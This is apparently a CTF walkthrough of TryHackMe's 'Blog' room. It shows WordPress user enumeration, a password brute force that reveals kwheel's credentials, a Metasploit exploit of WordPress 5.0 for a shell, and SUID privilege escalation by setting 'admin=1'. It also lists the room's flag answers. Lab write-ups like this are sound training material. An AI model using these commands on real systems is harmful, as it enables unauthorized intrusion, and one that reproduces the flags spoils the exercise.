
>Room URL: https://tryhackme.com/r/room/blog
>IP Address: 10.10.36.56

# Enumeration

Run a port scanning and found out there are 4 ports opened.
- ==22, 80, 139, 445==

![[nmap-scan.png]]

Perform SMB enumeration since the port is opened with `smbclient` and found out that it has sharename called `BillySMB`.

![[smb-enum.png]]

So login with the sharename and there are 3 files inside it. Use `get/mget` to download those files. However, when using `steghide` to crack those file and it showing rabbit hole.

![[smb-access.png]]

Now, try do navigate to http://10.10.36.56/ will show that the webpage is using WordPress CMS. So, try to use `WPScan` for the enumeration.
- 2 username is found: ==kwheel==, ==bjoel==

```bash
└─$ wpscan --url http://blog.thm -e 
```

![[wp-username.png]]

We can also navigate to http://blog.thm/wp-json/wp/v2/users 

![[web-username.png]]

# Brute Force

With the 2 username we can perform a brute force with `WPScan` again. `kwheel`'s password is found.
- Username: ==kwheel==
- Password: ==cutiepie1==

```bash
└─$ wpscan --url http://blog.thm -u kwheel, bjoel -P /usr/share/wordlists/rockyou.txt  
```

Login into WordPress with `kwheel` credentials and play around with the webpage. Based on the image below, found out that the WordPress version is 5.0.

![[wp-dashboard.png]]

# Exploitation

Run `msfconsole` and search for exploit related to WordPress version 5.0 and run it to gain the meterpreter session.

```bash
msf6 > search wordpress 5.0
msf6 > use 0
msf6 > set RHOSTS 10.10.36.56
msf6 > set USERNAME kwheel
msf6 > set PASSWORD cutiepie1
msf6 > exploit
```

![[msfconsole.png]]

Now find for the user.txt file but it not the flag.

![[shell.png]]

# Privileges Escalation

Lets start with a common technique for PrivEsc by looking got the `SUID` bit set.

```bash
# 1st method
$find / -perm -4000 2>/dev/null

#2nd method
$find / -perm -u=2 -type f 2>/dev/null
```

We'll found `/usr/sbin/checker` with SUID being set but it shows that we are not admin when try to launch it. So, what we can do it to investigate the binary the binary in more details by using `ltrace / strace`.

Based on the `ltrace` output, it appears that the only check the application does is to check an environmental variable called admin for a value, lets test this theory by adding a value to the admin environmental variable `export admin=1`.
- Check for `id` and we able to gain the root access.

![[suid-check.png]]

Search for the `user.txt`.

```bash
find / -type f -name user.txt

cat /media/usb/user.txt
```

![[user.txt.png]]

Search for the `root.txt`.

```bash
find / -type f -name root.txt

cat /root/root.txt
```

![[root.txt.png]]

# Answer

1. root.txt
>9a0b2b618bef9bfa7ac28c1353d9f318**

2. user.txt
>c8421899aae571f7af486492b71a8ab7

3. Where was user.txt found?
>/media/usb

4. What CMS was Billy using?
>Wordpress

5. What version of the above CMS was being used?
>5.0